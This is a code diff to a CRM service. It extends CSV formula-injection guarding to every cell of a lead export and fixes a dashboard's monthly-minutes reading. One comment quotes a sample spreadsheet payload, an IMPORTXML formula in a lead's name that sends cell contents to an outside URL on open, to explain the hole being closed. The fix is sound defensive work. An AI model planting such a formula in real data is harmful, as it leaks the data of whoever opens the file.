@@ -14,7 +14,6 @@ import io
 import re
 from dataclasses import dataclass
 from datetime import UTC, datetime, timedelta
-from decimal import Decimal
 from typing import Any, Literal, get_args
 from uuid import UUID
 
@@ -23,6 +22,7 @@ from sqlalchemy import text
 from sqlalchemy.ext.asyncio import AsyncSession
 
 from apps.api.agents.business_hours import count_after_hours_calls
+from apps.api.billing.caps import read_spend_counters
 from apps.api.core.errors import ProblemError
 from apps.api.core.spreadsheet_safety import disarm_for_csv
 from apps.api.crm.performance import IST_DAY_SQL, IST_HOUR_SQL, IST_TODAY_SQL
@@ -39,6 +39,7 @@ from apps.api.crm.schemas import (
 )
 from apps.api.db.base import uuid7
 from apps.api.db.result import rowcount_of
+from apps.api.db.session import session_tenant
 
 # The SAME pass that produced `text_redacted` — see `redacted_summary`. Imported at
 # module scope unlike `apps.workers.storage` in routes.py: `redaction` is pure regex
@@ -670,6 +671,11 @@ async def update_lead(
     return await get_lead(session, lead_id)
 
 
+#: The fixed columns of the lead export, in the order the row query selects them. Named
+#: so the header and the row cannot drift apart by an edit to one of them.
+_EXPORT_HEADER: tuple[str, ...] = ("phone", "name", "status", "source", "calls", "created_at")
+
+
 async def export_leads_csv(
     session: AsyncSession,
     *,
@@ -736,22 +742,38 @@ async def export_leads_csv(
     # everything also removes the class of bug where a client's own comma or newline
     # shifts every column to its right, which is the same defect one layer down.
     writer = csv.writer(buffer, quoting=csv.QUOTE_ALL)
-    writer.writerow(
-        ["phone", "name", "status", "source", "calls", "created_at", *[c.label for c in columns]]
-    )
+    # EVERY CELL GOES THROUGH THE GUARD, HEADER INCLUDED — the Sheets writer's rule
+    # (`integrations.service._cell`), arrived at here the expensive way.
+    #
+    # This used to disarm the extraction cells alone, and the hole that left was the
+    # `name` column beside them: `ingest.service` writes `leads.name` verbatim from a
+    # web-form or Meta webhook body and `coerce_value` does not strip formula leaders
+    # (`redteam_extraction_poisoning_test` pins that), so a lead named
+    # `=IMPORTXML("https://…"&A1,"//x")` executed the moment a client double-clicked
+    # their own export. Picking the "interesting" columns is what created the gap;
+    # rendering every column the one way is what closes it and keeps it closed.
+    #
+    # The HEADER: `columns` are labels from the tenant's extraction schema, which is
+    # authored text, and the export is downloaded by a client's staff — not the author.
+    # The threat is thinner than the `name` column's, but a header cell is a cell and
+    # the argument for exempting it is only that it is inconvenient to include.
+    #
+    # The other row columns, audited rather than assumed: `status` and `source` are
+    # CHECK-constrained enums (`ck_leads_status_enum`, `ck_leads_source_enum`), so no
+    # caller writes them today; `created_at` is an ISO-8601 instant and `call_count` an
+    # integer counter, both of which begin with a digit. None of them can lead a formula
+    # NOW — but that is a fact about four constraints, not a property of the row, and
+    # the cost of covering them is one function call each.
+    #
+    # The PHONE column changes shape: E.164 begins with `+`, a formula leader, so it is
+    # tab-prefixed on every row. That is not collateral damage — `+919812345678` is a
+    # formula to Excel, which evaluates it to `919812345678` and eats the country-code
+    # marker. The guard makes the number arrive as the string we stored.
+    writer.writerow([_csv_value(h) for h in _EXPORT_HEADER + tuple(c.label for c in columns)])
     for r in rows:
         data = r[6] or {}
-        writer.writerow(
-            [
-                r[0],
-                r[1] or "",
-                r[2],
-                r[3],
-                r[4],
-                r[5].isoformat() if r[5] else "",
-                *[_csv_value(data.get(c.key)) for c in columns],
-            ]
-        )
+        cells = (*r[:6], *(data.get(c.key) for c in columns))
+        writer.writerow([_csv_value(cell) for cell in cells])
     return buffer.getvalue()
 
 
@@ -1026,18 +1048,28 @@ def _actor_uuid(actor: Any) -> UUID | None:
 
 
 def _csv_value(value: Any) -> str:
-    """Render one extraction field for the export a client opens in Excel.
+    """Render ONE cell of the export a client opens in Excel — any column, any type.
 
-    DISARMED, because every value here is caller-supplied — a name, a business, a note
-    the agent transcribed — and a cell beginning `=`, `+`, `-` or `@` executes on open.
-    The Sheets writer has guarded the byte-identical value since D-23; this path did not,
-    and it is the one a human double-clicks. `core.spreadsheet_safety` holds the shared
-    leader set, the reason the two paths render the fix differently, and the sources.
+    DISARMED, because the values here are caller-supplied — a name a caller dictated or
+    a web form posted, a business, a note the agent transcribed — and a cell beginning
+    `=`, `+`, `-` or `@` executes on open. The Sheets writer has guarded the
+    byte-identical value since D-23; this path did not, and it is the one a human
+    double-clicks. `core.spreadsheet_safety` holds the shared leader set, the reason the
+    two paths render the fix differently, and the OWASP sources.
+
+    It renders the whole row rather than the extraction fields alone for the reason the
+    caller states: a renderer that covers some columns is a renderer whose next column
+    is unguarded, and that is exactly how `name` came to sit raw beside disarmed cells.
+    `datetime` is spelled out rather than left to `str()` so the export keeps its
+    ISO-8601 `T` separator — `str(datetime)` writes a space, and that is a format change
+    hiding inside a security fix.
     """
     if value is None:
         return ""
-    if isinstance(value, bool):
+    if isinstance(value, bool):  # bool before int — it is a subclass
         return "yes" if value else "no"
+    if isinstance(value, datetime):
+        return disarm_for_csv(value.isoformat())
     return disarm_for_csv(str(value))
 
 
@@ -1180,7 +1212,20 @@ async def dashboard(session: AsyncSession) -> DashboardOut:
             {f"class_{name}": list(statuses) for name, statuses in DAILY_CALL_CLASSES.items()},
         )
     ).all()
-    minutes = (await session.execute(text("SELECT minutes_used FROM spend_state LIMIT 1"))).scalar()
+    # `spend_state` holds ONE row per tenant (PK `tenant_id`), stamped with the billing
+    # month its counters belong to and reset by the meter on rollover — so "minutes used
+    # this month" is a question about the stamp as much as about the number. This tile
+    # carried a copy of the query with no month predicate, which is the pre-fix reader
+    # the gate, the admin directory and the health panel have all since dropped: an
+    # outbound-only tenant that has not metered yet in the new month was shown LAST
+    # month's minutes as this month's usage — on the dashboard, beside a call count that
+    # correctly said zero.
+    #
+    # `read_spend_counters` is the ONE month-aware reader (`billing/caps.py`), and a
+    # stale or absent row reads as zero there rather than as null: "we have no counter"
+    # and "the counter says nothing was used" are the same fact to a client, and this
+    # field has always been a number when a row existed.
+    counters = await read_spend_counters(session, tenant_id=await session_tenant(session))
 
     # One cheap existence check decides which definition the tile is entitled to. It is
     # asked of `agents` rather than inferred from the count above, because "no agent has
@@ -1210,7 +1255,7 @@ async def dashboard(session: AsyncSession) -> DashboardOut:
         outcome_split={row[0]: int(row[1]) for row in outcome},
         leads_new_7d=int(leads[0] or 0) if leads else 0,
         hot_leads_open=int(leads[1] or 0) if leads else 0,
-        minutes_used_month=Decimal(minutes) if minutes is not None else None,
+        minutes_used_month=counters.minutes_used,
         # Named columns rather than positional: six of them, and a chart that swaps
         # `failed` for `no_answer` is wrong in a way nobody reading it would notice.
         daily_7d=[
